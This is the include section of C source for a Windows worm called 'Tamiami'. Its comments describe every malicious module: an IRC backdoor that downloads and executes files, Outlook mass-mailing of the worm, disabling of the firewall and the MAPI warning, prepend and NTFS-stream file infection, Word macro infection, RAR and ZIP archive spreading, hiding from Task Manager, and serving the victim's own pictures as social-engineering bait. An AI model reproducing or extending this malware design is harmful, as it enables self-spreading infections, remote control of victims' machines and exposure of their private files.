   const int TamiamiSize = 143360;
   ///////////////////////////////
   // The worm size in bytes.
   ///////////////////////////////

   //////////////////////////////////////////////////////////////
   // Successful compiled with Microsoft© Visual C++© 6.0 SP5. //
   //////////////////////////////////////////////////////////////

   ///////////////////////////
   // Used by API's and stuff.
   ///////////////////////////
   #define WIN32_LEAN_AND_MEAN
   //#include <small.h> - no need for tiny code :)
   /*
   #pragma comment(linker,"/ENTRY:main")
   #pragma comment(linker,"/MERGE:.rdata=.data")
   #pragma comment(linker,"/MERGE:.text=.data")
   #pragma comment(lib,"msvcrt.lib")
   #if (_MSC_VER < 1300)
       #pragma comment(linker,"/IGNORE:4078")
       #pragma comment(linker,"/OPT:NOWIN98")
   #endif

   #define WIN32_LEAN_AND_MEAN
   */
   #include <windows.h>
   #include <winsock2.h>
   #include <mapi.h>
   #include <random.h>
   /*
   #include <stdlib.h>
   #include <time.h>
   #include <windows.h>

   bool Sranded = false;

   int RandomNumber(int MaxNumber)
   {
       int RN;

       if(Sranded == false)
       {
           srand((unsigned)time(0) + GetTickCount());
           Sranded = true;
       }

       RN = (rand()%MaxNumber);

       return RN;
   }
   */
   #include <wininet.h>
   #include <winnls.h>
   #include <tlhelp32.h>
   #include <shellapi.h>
   //////////////////////////

   #include "AbuseUrl.h"
   /////////////////////
   // Usage:       AbuseUrl(IPAddress, OutputUrl);
   // Description: This function generates a full social engeneering url with the
   //              http://username:pass@ip/ format with an give ip address. The ip address will
   //              be formated with EscapeUrl to %hex format. If the infected machine is a german
   //              one, a ".de" page will be created. Otherwise english pages, like ".com, .net, .org".
   // Parameters:  IPAddress - The ip address as string, as example "84.192.65.14".
   //              OutputUrl - A buffer with enough space, to hold the social engennered url. A
   //              example url (without "):
   //              "http://www.my-page.com:page_id@%38%34%2e%31%39%32%2e%36%35%2e%31%34/" .
   // Return:      True if social engeneered url is successful generated, otherwise false.
   // Example:     char IPAddress[] = "84.192.65.14";
   //              char AbusedUrl[150];
   //              AbuseUrl(IPAddress, AbusedUrl);
   /////////////////////

   #include "CreateWebseite.h"
   ///////////////////////////
   // Usage:       CreateWebsite(OutputDirectory, NumberOfPictures);
   // Description: This function will generate a website including some social engeneering text
   //              and (NumberOfPictures) pictures, including links to subsites and a link to
   //              the worm. If infected system is a german one, the text & worm name will be
   //              german, otherwise english.
   // Parameters:  OutputDirectory - This is the full path (end with "\") where the internet files
   //                                will be generated. Directory must exist.
   //              NumberOfPictures - Number of Pictures to include at the website, pictures must
   //                                 be already in the OutputDirectory, and named as "tamiami0",
   //                                 "tamiami1", "tamiami2" and so on. All pictures without
   //                                 suffixes. Browser will detect format.
   // Return:      True if webite is successful generated, otherwise false.
   // Example:     CreateWebsite("C:\\Windows\\TamiamiWeb\\", 3);
   ///////////////////////////

   #include "DisableMapiWarning.h"
   ///////////////////////////////
   // Usage:       DisableMapiWarning();
   // Description: This function disable the Outlook MAPI warning via manipulating the registry.
   // Parameters:  None.
   // Return:      True if successful disabled, otherwise false.
   // Example:     DisableMapiWarning();
   ///////////////////////////////

   #include "DisableXPFirewall.h"
   //////////////////////////////
   // Usage:       DisableXPFirewall();
   // Description: This function disables the firewall intigrated in XP SP2 via registry.
   // Parameters:  None.
   // Return:      True if successful disabled, otherwise false.
   // Example:     DisableXPFirewall();
   //////////////////////////////

   #include "DriveSpread.h"
   ////////////////////////
   // Usage:       DriveSpread();
   // Description: This function copy the worm file in different names to all fixed drives (A: - Z:).
   // Parameters:  None.
   // Return:      None.
   // Example      DriveSpread();
   ////////////////////////

   //#include "EscapeUrl.h" - already included in AbuseUrl.h
   //////////////////////
   // Usage:       EscapeUrl(Url, OuputBuffer);
   // Description: This function coverts a ip address in a %hex formated ip. As example the
   //              ip 84.192.65.14 will convert to %38%34%2e%31%39%32%2e%36%35%2e%31%34 .
   // Parameters:  Url - The Url as string that must be converted.
   //              OutputBuffer - points to a buffer with enough space.
   // Return:      Nothing.
   // Example:     char IPAddress[] = "84.192.65.14";
   //              char IPOutput[100];
   //              EscapeUrl(IPAddress, IPOutput);
   //////////////////////

   #include "FakeExtraction.h"
   ///////////////////////////
   // Usage:       FakeExtraction();
   // Description: Show some message boxes and ask the user to extract 4 pictures to current
   //              directory. If user click yes, 4 files with picture suffixes will be dropped
   //              to current directory. These files have random size and random content, mean
   //              you cant see anything. Message boxes will be displayed in german if system
   //              is a german one, otherwise in english.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     FakeExtraction();
   ///////////////////////////

   //#include "GermanLang.h" - already included in AbuseUrl.h
   /////////////////////////
   // Usage:       Germanlang();
   // Description: This function checks if the infected system is a german one.
   // Parameters:  None.
   // Return:      True if system is a german one, otherwise false;
   // Example:     GermanLang();
   /////////////////////////

   #include "GetAutostartPath.h"
   /////////////////////////////
   // Usage:       GetAutostartPath(AutostartPath);
   // Description: This function get's the first fitting application path from the "Run" key
   //              in the registry. It checks on the doublepoint (:) if it is the full path,
   //              if so it checks for the suffix is "exe" or "EXE". If this is true too, the
   //              function returns true.
   // Parameters:  AutostartPath - Points to a buffer with enough space for the full path of
   //                              an autostarting application.
   // Return:      True if a path is successful returned, otherwise false.
   // Example:     char    AutostartApplication[MAX_PATH];
   //              GetAutostartPath(AutostartApplication);
   /////////////////////////////

   #include "GetIp.h"
   //////////////////
   // Usage:       GetIp(IPAddress);
   // Description: This function get the ip address of the infected computer. First it tries to
   //              get the ip with usage of winsock. If the ip is a network one (192.168.*.*)
   //              the function connects to the internet and read the outside ip from
   //              checkip.dyndns.org.
   // Parameters:  IPAddress - Points to a buffer with enough space that will receive th ip address.
   // Return:      True if ip successful received, otherwise false.
   // Example:     char IPOutput[100];
   //              GetIP(IPOutput);
   //////////////////

   #include "GetOutlookContacts.h"
   ///////////////////////////////
   // Usage:       GetOutlookContacts(ExtractionDirectory);
   // Description: This function get all mail addresses from the outlook inbox and save each name
   //              as file in an directory, that avoids double addresses.
   // Parameters:  ExtractionDirectory - The directory where the file with the mail addresses will
   //              be saved. Has to end with "\". Directory must exist.
   // Return:      True if success, otherwise false.
   // Example:     GetOutlookContacts("C:\\Windows\\TamiamiMails\\");
   ///////////////////////////////

   #include "GetPictures.h"
   ////////////////////////
   // Usage:       GetPictures(CopyToDirectory, NumberOfPictures);
   // Description: This function will copy (NumberOfPictures) from infected machine's "My Pictures"
   //              folder to "CopyToDirectory". It have to end with "\", and must exist. The pictures
   //              will be copyed to "tamiami0", "tamiami1" and so on.
   // Parameters:  CopyToDirectory - Destination directory for the pictures
   //              (*.jpg, *.gif, *.bmp, *png).
   //              NumberOfPictures - number of pictures to copy from "My Pictures Folder".
   // Return:      Number of pictures successful copyed.
   // Example:     unsigned int PicturesCopyed;
   //              PicturesCopyed = GetPictures("C:\\Windows\\TamiamiWeb\\", 3);
   ////////////////////////

   #include "GetVersion.h"
   ///////////////////////
   // Usage:       GetVersion(Version, FullPath, AutostartMethod);
   // Description: This function reads the worm version from the file stored in the
   //              windows directory.
   // Parameters:  Version - Points to a buffer for the worm version as string.
   //              FullPath - Points to a buffer for the installation path of the worm,
   //              AutostartMethod - Points to a buffer for the autostart method.
   // Return:      True if success, otherwise false.
   // Example:     char    Ver[MAX_PATH]       = "";
   //              char    Path[MAX_PATH]      = "";
   //              char    AutoStart[MAX_PATH] = "";
   //              GetVersion(Ver, Path, AutoStart);
   ///////////////////////

   #include "HTTPServer.h"
   ///////////////////////
   // Usage:       HTTPServer(WebDirectory);
   // Description: This function starts a http server on the infected machine, and can provide a
   //              website with html files, pictures, flash, css, executables and so on. The
   //              web directory must end with "\" and must exist. Note that the function will
   //              create a endless loop, accepting all questions from outside.
   // Parameters:  WebDirectory - The directory that provides all files for a website, index.htm
   //              and so on. Note that the index file must end with ".htm" and not with ".html".
   // Return:      False if http server cant get started, otherwise it return nothing, because of
   //              the endless loop.
   // Example:     HTTPServer("C:\\Windows\\TamiamiWeb\\");
   ///////////////////////

   #include "IrcBackdoor.h"
   ////////////////////////
   // Usage:       IrcBackdoor(IrcServer, Channel, Channelkey);
   // Description: This function connects to a given IRC server and join the given Channel. If
   //              the bot is OP it set's channel as secret and set the given key. Then the bot
   //              listens for commands. Commands are:
   //                  ^^quit              - quit bot from irc.
   //                  ^^raw <command>     - send raw command to irc server.
   //                  ^^dlexe <url>       - download file from HTTP and execute it.
   // Parameters:  IrcServer - Connect to this IRC server.
   //              Channel - Join this channel.
   //              ChannelKey - With this channel password.
   // Return:      False if bot can't connect.
   //              True if bot quit connection with command.
   //              Nothing as long as it listen to commands.
   // Example:     IrcBackdoor("eu.undernet.org", "#testchannel", "testpass");
   ////////////////////////

   #include "IrcSpread.h"
   //////////////////////
   // Usage:       IrcSpread(IrcServer);
   // Description: This function connects to the IRC server, and joins 6 random channels. It waits
   //              for user JOIN, and spam a URL to an infected website to this user. If worm gets
   //              kicked or banned from a channel, it joins a new one.
   // Parameters:  IrcServer - To wich public IRC server should the worm connect
   // Return:      False if something goes wrong, and nothing if success, because worm idle in channels.
   // Example:     IrcSpread("eu.undernet.org");
   //////////////////////

   #include "IrcThreads.h"
   ///////////////////////
   // Usage:       IrcThreads();
   // Description: This function creates 7 threads, 6 for IRC spreading on public IRC servers, the
   //              last thread starts the IRC backdoor.
   // Return:      Nothing.
   // Example:     IrcThreads();
   ///////////////////////

   #include "MapiSendMail.h"
   /////////////////////////
   // Usage:       MapiSendMail(SessionHandle, MailToName, MailToAddress, Subject, Body, AttachedFileName, AttachedFilePath);
   // Description: This function sends a mail via the simple mapi. You must be already logged on
   //              into an mapi session.
   // Parameters:  SessionHandle - A handle to an mapi session, returned by MapiLogon.
   //              MailToName - Name of recipitant, not necessary, can be "".
   //              MailToAddress - Mail of recipitant, needed to send the mail.
   //              Subject - The Subject of the mail.
   //              Body - The text of the mail.
   //              AttachedFileName - File name of attached file, just need a filename not a path.
   //                                 If not needed set just "".
   //              AttachedFilePath - the full path to the file that must be attached. If not needed
   //                                 set just "".
   // Return:      True if mail successful send, otherwise false.
   // Example:     MapiSendMail(MapiSessionHandle, "DiA", "DiA@rrlf.de", "Heya", "RRLF is great...", "RRLF6.zip", "C:\\RRLF\\Zine6.zip");
   /////////////////////////

   #include "MassMailUrl.h"
   ////////////////////////
   // Usage:       MassMailUrl(MailAddressDirectory);
   // Description: This function mass mails the social engeneered url of the infected computer with
   //              some text and a subject to all addresses in the outlook inbox. If the victim mail
   //              address is a german one the text and subjects will be german, otherwise english.
   // Parameters:  MailAddressDirectory - The path where the victim mail addresses are stored as
   //                                     files. This path has to end with "\" and must exist.
   // Return:      True if success, otherwise false.
   // Example:     MassMailUrl("C:\\Windows\\TamiamiMails\\");
   ////////////////////////

   #include "MircSpread.h"
   ///////////////////////
   // Usage:       MircSpread();
   // Description: This function checks if mIRC is running, if so it create a script with several
   //              messages, and append a URL to infected pc. Then Tamiami loads the script into
   //              mIRC, when mIRC terminate, the script gets unloaded.
   // Parameters:  None.
   // Return:      True if successful generated and loaded, otherwise false.
   // Example:     MircSpread();
   ///////////////////////

   #include "NTFSCheck.h"
   //////////////////////
   // Usage:       NTFSCheck();
   // Description: This function test if drive C:\ is NTFS formated drive.
   // Parameters:  None.
   // Return:      True, if hard drive is NTFS formated, otherwise false.
   // Example:     NTFSCheck();
   //////////////////////

   #include "OnlyOneInstance.h"
   ////////////////////////////
   // Usage:       OnlyOneInstance(MutexName);
   // Description: This function checks if a instance of the worm already runs, if so it exits
   //              the current process.
   // Parameters:  MutexName - Name of worm instance.
   // Return:      Nothing.
   // Example:     OnlyOneInstance("Tamiami");
   ////////////////////////////

   #include "Payload.h"
   ////////////////////
   // Usage:       Payload();
   // Description: This fuction is the payload. It only activates on september 17. When activated
   //              it bomb's the screen with 5 random text messages, in random places with random
   //              colors. If it fails to create the DC it shows a simple message box.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     Payload();
   ////////////////////

   #include "Prepend.h"
   ////////////////////
   // Usage:       Prepend(FileToInfect);
   // Description: This function infects a file with the simple prepending methode. Infected
   //              file will look like this: WormFile + HostFile + "Tamiami". "Tamiami" is the
   //              infection marker as string.
   // Parameters:  FileToInfect - Full path of executable file to infect.
   // Return:      True if infection was successful, otherwise false.
   // Example:     Prepend("C:\\Windows\\Calc.exe");
   ////////////////////

   #include "RarPacker.h"
   //////////////////////
   // Usage:       AddToRar(RarFile, FileToAdd, PackedFileName, Attributes);
   // Description: This function add's a file to a RAR archive.
   //              Written by DR-EF, http://home.arcor.de/dr-ef/.
   // Parameters:  RarFile - The archive path, if file exist file will be added, if not
   //                        RAR archive will be created.
   //              FileToAdd - Path to the file to add to the RAR archive.
   //              PackedFileName - The filename in the RAR archive.
   //              Attributes - File attributes of the RAR archive.
   // Return:      TRUE if success, otherwise FALSE:
   // Example:     AddToRar("C:\\Archive.rar", "C:\\Worm.exe", "Install.exe", FILE_ATTRIBUTE_NORMAL);
   //////////////////////

   #include "RarWorm.h"
   ////////////////////
   // Usage:       RarWorm();
   // Description: This function adds the worm file with random name or name of archive to
   //              any RAR archives on any fixed/remote drive.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     RarWorm();
   ////////////////////

   #include "RegisterServiceProcess.h"
   ///////////////////////////////////
   // Usage:       RegisterServiceProcess();
   // Description: This function hides the worm from the task manager under win9x systems.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     RegisterServiceProcess();
   ///////////////////////////////////

   #include "RegisterVersion.h"
   ////////////////////////////
   // Usage:       RegisterVersion(Version, FullPath, AutostartMethod);
   // Description: This function writes information about the current worm version to a file
   //              in the windows directory.
   // Parameters:  Version - The worm version as string.
   //              FullPath - The path of the installed worm.
   //              AutostartMethod - The method how the worm autostarts.
   //                                "NTFS" >> Starts via stream companioning.
   //                                "Prepend" >> Starts via prepending.
   //                                "Regular" >> Starts via the regular autostart method.
   // Return:      True if the file was successful written, otherwise false.
   // Example:     RegisterVersion("Version 1", "C:\\Windows\\calc.exe:Tamiami", "NTFS");
   //              //^register version 1 with stream companioning autostart
   //              RegisterVersion("Version 1", "C:\\Windows\\calc.exe", "Prepend");
   //              //^register version 1 with prepending autostart
   //              RegisterVersion("Version 1", "C:\\Windows\\strangler.exe", "Regular");
   //              //^register version 1 with regular autostart method
   ////////////////////////////

   #include "SimpleAutostart.h"
   ////////////////////////////
   // Usage:       SimpleAutostart();
   // Description: This function copy the worm to the windows directory, and set a autorun
   //              key to the registry. This is the most common way to autostart a program.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     SimpleAutostart();
   ////////////////////////////

   #include "SimpleMassMail.h"
   ///////////////////////////
   // Usage:       SimpleMassMail();
   // Description: This function mass mails the worm body as attachment to all contacts in
   //              the inbox from outlook. It has multiple bodys and attachment names.
   //              If the system is a german one, it sends mail bodys and attachments with
   //              german language, otherwise english.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     SimpleMassMail();
   ///////////////////////////

   #include "StartHost.h"
   /////////////////////
   // Usage:       StartHost();
   // Description: This function extracts and starts the host program if the prepending methode
   //              was used.
   // Parameters:  None.
   // Return:      True if host successful executed, otherwise false.
   // Example:     StartHost();
   /////////////////////

   #include "StartStream.h"
   ////////////////////////
   // Usage:       StartStream();
   // Description: This function starts the stream "Tamiami" (host program) if it exist.
   // Parameters:  None.
   // Return:      True if stream successful started, otherwise false.
   // Example:     StartStream();
   ////////////////////////

   #include "StreamCompanion.h"
   ////////////////////////////
   // Usage:       StreamCompanion(FileToInfect);
   // Description: This function infects a executable via the stream companion method.
   //              Note that a NTFS formated drive is needed that this infection method works.
   // Parameters:  FileToInfect - Full path of executable to infect.
   // Return:      True if infection was successful, otherwise false.
   // Example:     StreamCompanion("C:\\Windows\\Calc.exe");
   ////////////////////////////

   #include "TakeCareOnMe.h"
   /////////////////////////
   // Usage:       TakeCareOnMe(TakeCareFullPath);
   // Description: This function drop's the tool "TakeCareOnMe 1.0" to the windows directory
   //              and executes it with the install path of the worm. This will cause that the
   //              worm restarts if it got terminated.
   // Parameters:  TakeCareFullPath - full path of application to take care for
   // Return:      True if successful, otherwise false.
   // Example:     TakeCareOnMe("C:\\WINDOWS\\strangler.exe");
   /////////////////////////

   #include "TerminateWormProcess.h"
   /////////////////////////////////
   // Usage:       TerminateWormProcess();
   // Description: This function terminate the installed running process of the worm.
   // Parameters:  None.
   // Return:      True if successful terminated, otherwise false.
   // Example:     TerminateWormProcess();
   /////////////////////////////////

   #include "UpdateWorm.h"
   ///////////////////////
   // Usage:       UpdateWorm(CurrentVersion);
   // Description: This function updates the worm if the current running version is higher
   //              then the installed. Therefor it stops the installed running process
   //              and checks how the worm autostarts. If it starts via NTFS method, it
   //              restore the original host, and infect it again with new version.
   //              Same with Prepend method. If it starts regular it just overwrites the
   //              old version with the new one.
   // Parameters:  CurrentVersion - String with the current version of the worm.
   // Return:      True if successful updated, otherwise false (same or newer version).
   // Example:     UpdateWorm("Tamaimi V1.3");
   ///////////////////////

   #include "WaitForConnection.h"
   //////////////////////////////
   // Usage:       WaitForConnection();
   // Description: This function query google.com and check if there is a internet connection.
   //              If not it sleeps 1 minute, and check again, and again...
   // Parameters:  None.
   // Return:      Nothing. Returns when ineternet connection is available.
   // Example:     WaitForConnection();
   //////////////////////////////

   #include "WordInfection.h"
   //////////////////////////
   // Usage:       WordInfection();
   // Description: This function drops a .vbs file and excutes it. This vbs file insert lines
   //              in the Normal.dot file from word. The function now infects every .doc that
   //              gets opened with the worm executable and a little dropper macro.
   // Parameters:  None.
   // Return:      True if successful dropped and executed, otherwise false.
   // Example:     WordInfection();
   //////////////////////////

   #include "WormInstalled.h"
   //////////////////////////
   // Usage:       WormInstalled();
   // Description: This function checks if the worm's properties file in the windows
   //              directory exists. If so the worm is already installed in the system.
   // Parameters:  None.
   // Return:      True if worm is already installed, otherwise false.
   // Example:     WormInstalled();
   //////////////////////////

   #include "ZipPackerIn.h"
   #include "ZipPackerOut.h"
   /////////////////////////
   // Usage:       CreateZip(ZipFile, MemLength, Type);
   //              ZipAdd(ZipHandle, InsideName, FileToAdd, MemLength, Type);
   //              CloseZip(ZipHandle);
   // Description: This functions can handle ZIP archives, I used it only to create ZIP
   //              archives, add files and close it. Coded/Modded by Lucian Wischik, original
   //              code by Mark Adler et al. I wonder if they want it for that usage ;).
   // Parameters:  ZipFile - the ZIP archive to create
   //              MemLength - must be 0 when using only with files.
   //              Type - what type is it, only ZIP_FILENAME is used.
   //              ZipHandle - handle to open ZIP archive.
   //              InsideName - under wich name store file in ZIP.
   //              FileToAdd - the file to add to the ZIP archive.
   // Return:      CreateZip - HZIP (handle) to ZIP file, otherwise 0.
   //              ZipAdd - ZRESULT is ZR_OK, otherwise other value.
   //              CloseZip - nothing.
   // Example:     HZIP ZipHandle;
   //              ZipHandle = CreateZip("test.zip", 0, ZIP_FILENAME);
   //              ZipAdd(ZipHandle, "Install.exe", "Worm.exe", 0, ZIP_FILENAME);
   //              CloseZip(ZipHandle);
   /////////////////////////

   #include "ZipWorm.h"
   ////////////////////
   // Usage:       ZipWorm();
   // Description: This function adds the worm file under random names to all ZIP archives
   //              on all drives. OpenZip doesnt work for me, so its little other techique then
   //              RarWorm(). It adds the zip to the zip itself, and biside the worm executable.
   // Parameters:  None.
   // Return:      Nothing.
   // Example:     ZipWorm();
   ////////////////////
